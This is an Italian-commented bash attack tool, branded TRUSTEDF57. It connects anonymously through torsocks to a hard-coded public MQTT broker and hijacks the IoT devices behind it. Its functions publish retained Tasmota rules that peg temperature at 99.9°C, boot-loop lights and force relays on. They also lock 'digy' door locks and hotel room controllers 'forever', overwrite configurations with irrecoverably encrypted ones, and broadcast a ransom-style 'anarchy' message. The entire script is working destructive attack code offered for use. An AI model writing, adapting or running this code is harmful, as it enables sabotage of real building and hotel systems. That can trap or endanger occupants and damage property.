#!/bin/bash


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

MQTT_HOST="104.198.241.70"
MQTT_PORT="1883"
TOR="torsocks"

# VALORI MASSIMI FUNZIONANTI
MAX_TEMP=99.9        # Tasmota accetta fino 99.9
MAX_BRIGHT=255       # PWM max
MAX_POWER=100        # Relay 100%
LOCKED_STATUS="LOCKED-TRUSTEDF57"

# RANSOM LEGGIBILE
RANSOM_MSG="🔥  LOCKDOWN - TRUSTEDF57
I DON'T WANT MONEY, I WANT ANARCHY!
SYSTEMS LOCKED FOREVER - NO CONTROL POSSIBLE"

# CRYPTO FUNCTION (funziona ma irrecuperabile)
ENCRYPT_PAYLOAD() {
    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-ANARCHY" 2>/dev/null | sed 's/=//g'
}

menu() {
    echo -e "${PURPLE}┌─ TRUSTEDF57 - FUNCTIONAL LOCK ────────────────┐${NC}"
    echo -e "${PURPLE}│ 1) 🔍 FORCE ONLINE + LOCK${NC}"
    echo -e "${PURPLE}│ 2) 🌡️ MAX TEMP LOOP (NON crash)${NC}"
    echo -e "${PURPLE}│ 3) 💡 LUCI LAMPEGGIO PERMANENTE${NC}"
    echo -e "${PURPLE}│ 4) 🚪 PORTE LOCKED FOREVER${NC}"
    echo -e "${PURPLE}│ 5) 🏨 HOTEL ROOMS LOCKDOWN${NC}"
    echo -e "${PURPLE}│ 6) 💻 TASMOTA RULE LOCK${NC}"
    echo -e "${PURPLE}│ 7) 📢 RANSOM BROADCAST${NC}"
    echo -e "${PURPLE}│ 8) 🔒 LOCK ALL CONFIGS (funzionanti)${NC}"
    echo -e "${PURPLE}│ 9) 🎪 TOTAL FUNCTIONAL ANARCHY${NC}"
    echo -e "${PURPLE}│ 0) ❌ EXIT${NC}"
    echo -e "${PURPLE}└────────────────────────────────────────────────┘${NC}"
    read -p "➤: " choice
}

force_online() {
    echo -e "${GREEN}[+] FORCE ONLINE...${NC}"
    ${TOR} mosquitto_sub -h ${MQTT_HOST} -p ${MQTT_PORT} -t '#LWT' -v -C 200 | \
    while read topic payload; do
        echo -e "${YELLOW}[ON] ${topic}${NC}"
        ${TOR} mosquitto_pub -h ${MQTT_HOST} -p ${MQTT_PORT} -t "$topic" -m "Online" -r -q 2
        save_target "$topic"
    done &
}

# 2. MAX TEMP LOOP (funziona sempre)
temp_loop() {
    echo -e "${RED}[🌡️] MAX TEMP ${MAX_TEMP}°C → LOOP PERMANENTE${NC}"
    loop_cmd="Backlog Temp ${MAX_TEMP};Rule1 ON MQTT#Message DO Temp ${MAX_TEMP} ENDON;Rule1 1"
    ${TOR} mosquitto_pub -h ${MQTT_HOST} -p ${MQTT_PORT} -t "cmnd/+/Temp" -m "$loop_cmd" -r -q 1
    ${TOR} mosquitto_pub -h ${MQTT_HOST} -p ${MQTT_PORT} -t "#temp" -m "$MAX_TEMP" -r -q 1
}

# 3. LUCI LAMPEGGIO PERMANENTE (Rule bootloop)
lights_loop() {
    echo -e "${RED}[💡] LUCI ${MAX_BRIGHT} LAMPEGGIO → BOOTLOOP${NC}"
    light_rule="Rule1 ON System#Boot DO Backlog Power1 1;Delay 500;Power1 0;Delay 500;Power1 1;Brightness ${MAX_BRIGHT};Speed 10;ENDON;Rule1 1"
    ${TOR} mosquitto_pub -h ${MQTT_HOST} -p ${MQTT_PORT} -t "cmnd/+/Backlog" -m "$light_rule" -r -q 1
    ${TOR} mosquitto_pub -h ${MQTT_HOST} -p ${MQTT_PORT} -t "cmnd/+/Power1" -m "1" -r -q 1
}

# 4. PORTE LOCKED FOREVER
doors_locked() {
    for lock in "${DIGY_LOCKS[@]}"; do
        echo -e "${RED}[🚪] ${lock} → LOCKED FOREVER${NC}"
        lock_payload="${LOCKED_STATUS},${MAX_POWER},PERMANENT"
        ${TOR} mosquitto_pub -h ${MQTT_HOST} -p ${MQTT_PORT} -t "$lock" -m "$lock_payload" -r -q 2
        ${TOR} mosquitto_pub -h ${MQTT_HOST} -p ${MQTT_PORT} -t "${lock}/stat" -m "${RANSOM_MSG}" -r -q 2
    done
}

# 5. HOTEL ROOMS LOCKDOWN
hotel_lockdown() {
    for room in "${HOTEL_ROOMS[@]}"; do
        base=$(echo $room | sed 's#tele/.*##')
        echo -e "${RED}[🏨] ${base} → LOCKDOWN${NC}"
        
        # Ransom leggibile
        ${TOR} mosquitto_pub -h ${MQTT_HOST} -p ${MQTT_PORT} -t "${base}birth" -m "{\"online\":true,\"status\":\"${LOCKED_STATUS}\",\"message\":\"${RANSOM_MSG}\"}" -r -q 2
        
        # Config crittata MA funzionante
        locked_config="{\"roomId\":\"${LOCKED_STATUS}\",\"fw\":\"ANARCHY\",\"temp\":${MAX_TEMP},\"control\":\"DISABLED\"}"
        crypt_config=$(echo "$locked_config" | ENCRYPT_PAYLOAD)
        ${TOR} mosquitto_pub -h ${MQTT_HOST} -p ${MQTT_PORT} -t "${base}config" -m "$crypt_config" -r -q 2
    done
}

# 6. TASMOTA PERMANENT LOCK
tasmota_lock() {
    for dev in "${TASMOTA[@]}"; do
        base=$(echo $dev | sed 's#/discovery.*##')
        echo -e "${RED}[⚡] ${base} → RULE LOCK${NC}"
        
        # Rule che blocca tutto al max forever
        lockdown_rule="Rule1 ON System#Boot DO Backlog Power1 100;Temp ${MAX_TEMP};Brightness ${MAX_BRIGHT};MqttRetain 1;Rule1 ON Power1#State DO Power1 100 ENDON;ENDON;Rule1 1"
        
        ${TOR} mosquitto_pub -h ${MQTT_HOST} -p ${MQTT_PORT} -t "${base}/cmnd/Rule1" -m "$lockdown_rule" -r -q 2
        ${TOR} mosquitto_pub -h ${MQTT_HOST} -p ${MQTT_PORT} -t "${base}/cmnd/Backlog" -m "Status 0;Restart 1" -r -q 2
    done
}

# 7. RANSOM BROADCAST
ransom_broadcast() {
    echo -e "${RED}[📢] MESSAGE su tutti i pannelli${NC}"
    topics=("hotel/rooms/+/birth" "#LWT" "digy/#" "tasmota/discovery/+/config" "$SYS/broker/version")
    for topic in "${topics[@]}"; do
        ${TOR} mosquitto_pub -h ${MQTT_HOST} -p ${MQTT_PORT} -t "$topic" -m "${RANSOM_MSG}" -r -q 2
    done
}

# 8. LOCK CONFIGS (crittate MA funzionanti)
lock_configs() {
    echo -e "${PURPLE}[🔒] Configs LOCKED (funzionanti)${NC}"
    configs=("tasmota/discovery/+/config" "hotel/rooms/+/config" "#config")
    for topic in "${configs[@]}"; do
        locked_json="{\"status\":\"${LOCKED_STATUS}\",\"control\":\"BLOCKED\",\"anarchy\":\"TRUSTEDF57\"}"
        crypt_json=$(echo "$locked_json" | ENCRYPT_PAYLOAD)
        ${TOR} mosquitto_pub -h ${MQTT_HOST} -p ${MQTT_PORT} -t "$topic" -m "$crypt_json" -r -q 2
    done
}

# 9. TOTAL ANARCHY FUNCTIONAL
total_anarchy() {
    echo -e "${RED}🎪 TOTAL FUNCTIONAL TRUSTEDF57 💀${NC}"
    force_online &
    sleep 3
    temp_loop
    lights_loop
    hotel_lockdown
    doors_locked
    tasmota_lock
    ransom_broadcast
    lock_configs
    echo -e "${CYAN}✅ ANARCHY v4: FUNZIONANTE + LOCKED FOREVER${NC}"
}

save_target() {
    local topic=$1
    [[ $topic == *"hotel"* ]] && HOTEL_ROOMS+=("$topic")
    [[ $topic == *"digy"* ]] && DIGY_LOCKS+=("$topic")
    [[ $topic == *"tasmota"*|"*sonoff"* ]] && TASMOTA+=("$topic")
}

# INIT ARRAYS
declare -a HOTEL_ROOMS=() DIGY_LOCKS=() TASMOTA=()

while true; do
    menu
    case $choice in
        1) force_online ;;
        2) temp_loop ;;
        3) lights_loop ;;
        4) doors_locked ;;
        5) hotel_lockdown ;;
        6) tasmota_lock ;;
        7) ransom_broadcast ;;
        8) lock_configs ;;
        9) total_anarchy ;;
        0) exit 0 ;;
        *) echo "${YELLOW}Invalid${NC}" ;;
    esac
    read -p $'\nPress ENTER...'
done
